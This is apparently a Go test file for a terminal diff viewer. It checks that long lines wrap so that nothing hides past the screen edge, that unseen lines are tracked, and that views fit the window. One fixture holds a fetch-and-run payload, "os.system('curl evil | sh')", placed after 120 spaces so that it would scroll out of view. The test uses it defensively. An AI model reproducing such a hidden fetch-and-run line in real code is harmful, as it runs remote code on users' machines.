package diff

import (
	"strings"
	"testing"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/x/ansi"

	"herdr-dots/internal/patchstore"
)

const payload = "os.system('curl evil | sh')"

// probeLine hides its payload past the right edge of any normal terminal.
var probeLine = "+x = 1" + strings.Repeat(" ", 120) + "; " + payload

func probePatch(before int) string {
	var b strings.Builder
	b.WriteString("diff --git a/run.py b/run.py\n--- a/run.py\n+++ b/run.py\n@@ -1,1 +1,40 @@\n")
	for i := 0; i < before; i++ {
		b.WriteString("+a\n")
	}
	b.WriteString(probeLine + "\n")
	return b.String()
}

func probeMeta() patchstore.Meta {
	return patchstore.Meta{ID: "0123456789abcdef", Dot: "x", Stat: "1 file", Paths: []string{"run.py"}}
}

// diffText is the diff column of a view (the window minus the header and
// footer lines, and minus the file list in the two-column layout), ANSI
// stripped, continuation markers removed and rows joined, so a wrapped line
// reads as one string. Full rows have no padding, so a split payload rejoins.
func diffText(v string, w int) string {
	var b strings.Builder
	ls := strings.Split(ansi.Strip(v), "\n")
	for _, l := range ls[1 : len(ls)-1] {
		if w >= 60 {
			l = ansi.TruncateLeft(l, min(44, max(14, w/3))+3, "")
		}
		b.WriteString(strings.TrimPrefix(l, contMark))
	}
	return b.String()
}

func TestALongLinesHiddenPayloadIsOnScreen(t *testing.T) {
	for _, w := range []int{80, 140} {
		m := sized(New([]byte(probePatch(0)), probeMeta(), "7", &recCaller{}), w, 30)
		v := m.View()
		if !strings.Contains(diffText(v, w), payload) {
			t.Errorf("width %d: payload not on screen:\n%s", w, v)
		}
		if !strings.Contains(v, contMark) {
			t.Errorf("width %d: no continuation marker:\n%s", w, v)
		}
		if u := m.unseen(); len(u) != 0 {
			t.Errorf("width %d: whole line was on screen, still unseen %v", w, u)
		}
		if v := send(m, "A").View(); strings.Contains(v, "Not yet viewed") {
			t.Errorf("width %d: confirm warns although everything was shown:\n%s", w, v)
		}
	}
}

func TestALongLineStaysUnseenUntilItsTailRowWasOnScreen(t *testing.T) {
	// height 20, no summary: header + help line leave 18 diff rows. The
	// long line starts on the last row; its tail rows are below the edge.
	const h = 20
	m := sized(New([]byte(probePatch(13)), probeMeta(), "7", &recCaller{}), 80, h)
	if u := m.unseen(); len(u) != 1 {
		t.Fatalf("only the long line's first row was shown, unseen %v", u)
	}
	if v := send(m, "A").View(); !strings.Contains(v, "Not yet viewed: run.py") {
		t.Fatalf("confirm must name the file:\n%s", v)
	}
	rows := len(wrapLine(clean(probeLine), 51, 50))
	if rows < 3 {
		t.Fatalf("test needs a line of 3+ rows, got %d", rows)
	}
	var tm tea.Model = m
	for i := 0; i < rows-2; i++ {
		tm = send(tm, "down")
	}
	if u := tm.(Model).unseen(); len(u) != 1 {
		t.Fatalf("the tail row is still below the edge, unseen %v", u)
	}
	tm = send(tm, "down")
	if u := tm.(Model).unseen(); len(u) != 0 {
		t.Fatalf("every row was on screen, unseen %v", u)
	}
}

func TestATallLineIsSeenAcrossScrolls(t *testing.T) {
	// one line far taller than the page: it is only seen once every row
	// has been on screen, even though never all at once.
	long := "+" + strings.Repeat("y", 4000)
	p := "diff --git a/a b/a\n--- a/a\n+++ b/a\n@@ -1 +1 @@\n" + long + "\n"
	meta := patchstore.Meta{ID: "0123456789abcdef", Dot: "x", Stat: "1 file", Paths: []string{"a"}}
	m := sized(New([]byte(p), meta, "7", &recCaller{}), 80, 12)
	var tm tea.Model = m
	for i := 0; i < 200 && len(tm.(Model).unseen()) != 0; i++ {
		tm, _ = tm.Update(tea.KeyMsg{Type: tea.KeyPgDown})
	}
	if u := tm.(Model).unseen(); len(u) != 0 {
		t.Fatalf("paged through the whole line, still unseen %v", u)
	}
	if got := strings.Count(diffText(tm.View(), 80), "y"); got == 0 {
		t.Fatal("the tail of the line never showed")
	}
}

func TestWideRuneLinesWrapWithinTheWidth(t *testing.T) {
	line := "+" + strings.Repeat("宽", 200)
	p := strings.Replace(samplePatch, `+var store = "cookie"`, line, 1)
	for _, w := range []int{30, 59, 61, 80, 140} {
		m := sized(New([]byte(p), sampleMeta(), "7", &recCaller{}), w, 60)
		v := m.View()
		for _, l := range strings.Split(v, "\n") {
			if lw := ansi.StringWidth(l); lw > w {
				t.Errorf("width %d: row of width %d: %q", w, lw, l)
			}
		}
		if got := strings.Count(v, "宽"); got != 200 {
			t.Errorf("width %d: %d of 200 wide runes on screen:\n%s", w, got, v)
		}
	}
	for limit := 2; limit < 12; limit++ {
		rows := wrapLine(line, limit, limit-1)
		if strings.Join(rows, "") != line {
			t.Fatalf("limit %d: wrapping lost text", limit)
		}
		for i, r := range rows {
			max := limit
			if i > 0 {
				max = limit - 1
			}
			if ansi.StringWidth(r) > max && ansi.StringWidth(r) > 2 {
				t.Fatalf("limit %d row %d: width %d", limit, i, ansi.StringWidth(r))
			}
		}
	}
}

func TestViewNeverExceedsTheWindowAtAnySize(t *testing.T) {
	p := strings.Replace(samplePatch, `+var store = "cookie"`, probeLine+"\n+"+strings.Repeat("宽", 150), 1)
	for h := 4; h <= 40; h++ {
		for w := 30; w <= 200; w++ {
			base := sized(New([]byte(p), sampleMeta(), "7", &recCaller{}), w, h)
			for name, m := range map[string]tea.Model{
				"plain":    base,
				"armed":    sized(New([]byte(p), sampleMeta(), "7", &recCaller{}).Arm(), w, h),
				"confirm":  send(base, "A"),
				"scrolled": send(base, "down", "down", "down", "n"),
			} {
				v := m.View()
				lines := strings.Split(v, "\n")
				if len(lines) > h {
					t.Fatalf("%s %dx%d: %d lines:\n%s", name, w, h, len(lines), v)
				}
				for _, l := range lines {
					if lw := ansi.StringWidth(l); lw > w {
						t.Fatalf("%s %dx%d: line of width %d: %q", name, w, h, lw, l)
					}
				}
			}
		}
	}
}

func TestResizingKeepsTheTopSourceLine(t *testing.T) {
	m := sized(New([]byte(probePatch(30)), probeMeta(), "7", &recCaller{}), 80, 20)
	var tm tea.Model = m
	tm = send(tm, "down", "down", "down", "down", "down")
	before := tm.(Model).topLine()
	tm, _ = tm.Update(tea.WindowSizeMsg{Width: 140, Height: 20})
	if after := tm.(Model).topLine(); after != before {
		t.Fatalf("top source line %d became %d after a resize", before, after)
	}
}
